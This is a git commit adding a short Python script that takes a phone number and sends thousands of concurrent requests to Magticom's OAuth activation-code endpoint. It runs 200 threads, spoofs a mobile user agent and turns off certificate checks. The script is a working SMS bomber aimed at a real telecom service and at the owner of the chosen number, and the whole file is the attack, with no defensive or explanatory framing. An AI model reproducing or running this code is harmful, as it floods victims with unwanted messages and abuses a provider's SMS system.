682468231f6de4687f25686469d0f56bc912b5a3
Dimitri Zhorzholiani <37780087+mike2505@users.noreply.github.com>
2022-09-29 19:43:44 +0400

    Create main.py

---
+++ main.py
@@ -0,0 +1,29 @@
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+num = str(input('Enter Number: '))
+headers = {
+    'Host': 'oauth.magticom.ge',
+    'Content-Type': 'application/json',
+    # 'Content-Length': '0',
+    # 'Accept-Encoding': 'gzip, deflate',
+    'User-Agent': 'okhttp/3.10.0',
+    'Connection': 'close',
+}
+
+params = {
+    'userIdentifier': num,
+}
+
+def send():
+    response = requests.post('https://oauth.magticom.ge/auth/user/activation-code/send', params=pa
+rams, headers=headers, verify=False)
+    print('sms sent')
+
+processes = []
+with ThreadPoolExecutor(max_workers=200) as executor:
+    for i in range(10,100):
+        for j in range(100):
+            processes.append(executor.submit(send, ))
